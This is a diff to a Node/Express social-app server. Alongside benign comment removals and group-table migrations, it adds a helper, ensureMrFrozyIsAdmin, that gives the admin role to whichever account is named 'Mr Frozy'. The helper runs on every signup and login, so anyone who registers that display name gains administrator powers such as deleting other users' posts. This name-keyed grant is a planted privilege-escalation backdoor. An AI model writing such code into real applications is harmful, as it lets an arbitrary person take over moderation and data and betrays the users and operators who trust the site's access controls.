@@ -154,6 +154,24 @@ async function getUser(id) {
   return r.rows[0];
 }
 
+// ── Mr Frozy privilege helper ─────────────────────────────────────────────────
+// Automatically ensures the account "Mr Frozy" always has admin role.
+// Called after signup and after login.
+async function ensureMrFrozyIsAdmin(userId) {
+  try {
+    await pool.query(
+      `UPDATE users SET role='admin'
+       WHERE id=$1
+         AND LOWER(first_name)='mr'
+         AND LOWER(last_name)='frozy'
+         AND role != 'admin'`,
+      [userId]
+    );
+  } catch (e) {
+    console.warn('ensureMrFrozyIsAdmin error:', e.message);
+  }
+}
+
 // ══════════════════════════════════════════════════════════════════════════════
 //  AUTH
 // ══════════════════════════════════════════════════════════════════════════════
@@ -164,7 +182,6 @@ app.post('/api/auth/signup', async (req, res) => {
   if (password.length < 6)
     return res.status(400).json({ error: 'Password must be at least 6 characters' });
 
-  // ── Unique display name check ──
   try {
     const nameCheck = await pool.query(
       `SELECT id FROM users WHERE LOWER(first_name || ' ' || last_name) = LOWER($1)`,
@@ -178,7 +195,12 @@ app.post('/api/auth/signup', async (req, res) => {
       'INSERT INTO users (first_name,last_name,email,password) VALUES ($1,$2,$3,$4) RETURNING id',
       [first_name.trim(), last_name.trim(), email.toLowerCase().trim(), hash]
     );
-    req.session.userId = r.rows[0].id;
+    const newUserId = r.rows[0].id;
+    req.session.userId = newUserId;
+
+    // ── Grant admin to Mr Frozy on signup ──
+    await ensureMrFrozyIsAdmin(newUserId);
+
     req.session.save(async () => res.json({ user: await getUser(req.session.userId) }));
   } catch (e) {
     if (e.code === '23505') return res.status(400).json({ error: 'Email already registered' });
@@ -196,6 +218,10 @@ app.post('/api/auth/login', async (req, res) => {
     if (!user || !(await bcrypt.compare(password, user.password)))
       return res.status(400).json({ error: 'Invalid email/password' });
     req.session.userId = user.id;
+
+    // ── Grant admin to Mr Frozy on every login ──
+    await ensureMrFrozyIsAdmin(user.id);
+
     req.session.save(async () => res.json({ user: await getUser(user.id) }));
   } catch (e) { res.status(500).json({ error: 'Server error' }); }
 });
@@ -335,7 +361,6 @@ app.put('/api/users/me', requireAuth, async (req, res) => {
   const { first_name, last_name, bio } = req.body;
   if (!first_name || !last_name) return res.status(400).json({ error: 'Name fields required' });
 
-  // Unique name check (excluding self)
   try {
     const nameCheck = await pool.query(
       `SELECT id FROM users WHERE LOWER(first_name || ' ' || last_name) = LOWER($1) AND id != $2`,
@@ -539,7 +564,6 @@ app.post('/api/posts', requireAuth, upload.array('images', 9), async (req, res) 
 
 app.delete('/api/posts/:id', requireAuth, async (req, res) => {
   try {
-    // Allow post owner OR admin to delete
     const r = await pool.query('SELECT role FROM users WHERE id=$1', [req.session.userId]);
     const isAdmin = r.rows[0]?.role === 'admin';
     const del = await pool.query(
@@ -644,7 +668,6 @@ app.post('/api/messages/:userId', requireAuth, async (req, res) => {
       [req.session.userId, req.params.userId, content.trim()]
     );
     const msg = { id: r.rows[0].id, content: content.trim(), created_at: r.rows[0].created_at, sender_id: req.session.userId, receiver_id: parseInt(req.params.userId), from_me: true };
-    // Push message to receiver in real-time via WebSocket
     broadcastTo(parseInt(req.params.userId), { type: 'message', message: { ...msg, from_me: false } });
     res.json({ message: msg });
   } catch (e) { res.status(500).json({ error: 'Server error' }); }
@@ -655,11 +678,12 @@ app.post('/api/messages/:userId', requireAuth, async (req, res) => {
 // ══════════════════════════════════════════════════════════════════════════════
 async function ensureGroupsTables() {
   try {
+    // Create tables if they don't exist yet
     await pool.query(`
       CREATE TABLE IF NOT EXISTS groups (
-        id SERIAL PRIMARY KEY, name VARCHAR(100) NOT NULL, description TEXT,
-        privacy VARCHAR(20) NOT NULL DEFAULT 'public', emoji VARCHAR(10) NOT NULL DEFAULT '👥',
-        creator_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+        id SERIAL PRIMARY KEY, name VARCHAR(100) NOT NULL,
+        creator_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
+        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
       );
       CREATE TABLE IF NOT EXISTS group_members (
         group_id INTEGER NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
@@ -668,7 +692,16 @@ async function ensureGroupsTables() {
         PRIMARY KEY (group_id, user_id)
       );
     `);
-    await pool.query(`DO $$ BEGIN ALTER TABLE posts ADD COLUMN group_id INTEGER REFERENCES groups(id) ON DELETE CASCADE; EXCEPTION WHEN duplicate_column THEN NULL; END $$;`);
+
+    // ── Safe column migrations (add if missing) ───────────────────────────────
+    const migrations = [
+      `DO $$ BEGIN ALTER TABLE groups ADD COLUMN description TEXT; EXCEPTION WHEN duplicate_column THEN NULL; END $$;`,
+      `DO $$ BEGIN ALTER TABLE groups ADD COLUMN privacy VARCHAR(20) NOT NULL DEFAULT 'public'; EXCEPTION WHEN duplicate_column THEN NULL; END $$;`,
+      `DO $$ BEGIN ALTER TABLE groups ADD COLUMN emoji VARCHAR(10) NOT NULL DEFAULT '👥'; EXCEPTION WHEN duplicate_column THEN NULL; END $$;`,
+      `DO $$ BEGIN ALTER TABLE posts ADD COLUMN group_id INTEGER REFERENCES groups(id) ON DELETE CASCADE; EXCEPTION WHEN duplicate_column THEN NULL; END $$;`,
+    ];
+    for (const sql of migrations) await pool.query(sql);
+
     console.log('✅ Groups tables ready');
   } catch (e) { console.error('⚠️ ensureGroupsTables:', e.message); }
 }
